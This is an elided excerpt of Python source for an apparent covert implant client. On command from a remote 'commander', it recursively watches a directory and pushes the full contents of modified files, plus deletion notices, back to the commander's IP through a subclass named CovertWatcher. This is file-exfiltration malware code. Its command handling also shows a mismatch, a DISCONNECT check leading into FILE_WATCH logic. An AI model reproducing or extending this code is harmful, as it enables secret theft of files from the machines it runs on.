...
class Client:
    ...
    def process_command(self, command_type, payload, src_ip):
        ...
        if command_type == CommandType.DISCONNECT:
            ...
            watch_dir = payload.decode('utf-8', errors='ignore').strip()
            if not watch_dir or watch_dir == '.':
                watch_dir = os.getcwd()
            print(f"[*] Processing FILE_WATCH: {watch_dir}")

            if not os.path.isdir(watch_dir):
                msg = f"Directory not found: {watch_dir}"
                print(f"    Error: {msg}")
                self.send_response(src_ip, CommandType.ERROR, msg.encode())
                return

            # Stop any existing watcher
            self._stop_file_watcher()

            # Send ACK so commander knows watching has started
            self.send_response(src_ip, CommandType.ACK,
                               f"Watching {watch_dir}".encode())

            # Start new watcher in background thread
            self._watcher_stop.clear()
            self._watcher_thread = threading.Thread(
                target=self._run_file_watcher,
                args=(watch_dir, src_ip),
                daemon=True
            )
    ...
    def _run_file_watcher(self, watch_dir, commander_ip):
        """
        Thread target: run FileWatcher and push events to the commander.

        Modified/created files  � FILE_WATCH  payload: filename_len(2B) | filename | filedata
        Deleted/moved-away files � FILE_DELETE payload: filename (utf-8)
        """
        print(f"[*] File watcher thread started: {watch_dir}")

        def on_write(src_path):
            """Called by watcher when a file is closed after writing."""
            ...
            try:
                ...
                payload = struct.pack('!H', len(filename_bytes)) + filename_bytes + filedata
                print(f"[*] Watcher: sending modified file '{filename}' "
                      f"({len(filedata)} bytes) to {commander_ip}")
                self.send_response(commander_ip, CommandType.FILE_WATCH, payload)
            except Exception as e:
                print(f"[!] Watcher: could not send '{filename}': {e}")

        def on_delete(filename):
            """Called by watcher when a file is deleted or moved away."""
            if self._watcher_stop.is_set():
                return
            print(f"[*] Watcher: notifying deletion of '{filename}' to {commander_ip}")
            self.send_response(commander_ip, CommandType.FILE_DELETE,
                               filename.encode('utf-8'))

        # Subclass FileWatcher to inject our callbacks
        class CovertWatcher(FileWatcher):
            def _stage_file(inner_self, src):
                on_write(src)

            def _unstage_file(inner_self, filename):
                on_delete(filename)

        try:
            watcher = CovertWatcher(
                path=watch_dir,
                recursive=True,
                ignore_exts={'.swp', '.swx', '.tmp'},
            )

            # Patch the adapter's event_gen to check stop flag each iteration
